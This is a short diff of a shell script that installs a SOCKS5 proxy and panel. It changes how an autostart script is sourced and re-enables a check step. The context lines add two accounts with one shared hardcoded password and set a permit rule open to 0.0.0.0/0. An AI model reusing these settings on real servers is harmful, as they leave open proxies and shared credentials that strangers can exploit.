@@ -73,7 +73,7 @@ sed -i '203c permit u	0.0.0.0/0	-	0.0.0.0/0	-	-	-	-	-' $confFile
 useradd Super1 -p ECYnFg6TqsoUFIO
 useradd Super2 -p ECYnFg6TqsoUFIO
 
-./mnt/shell/autostart.sh
+. /mnt/shell/autostart.sh
 
 echo "Install OK!"
 #添加开机启动
@@ -151,4 +151,4 @@ Clear
 Download
 InstallSock5
 InstallPanel
-# check
+check
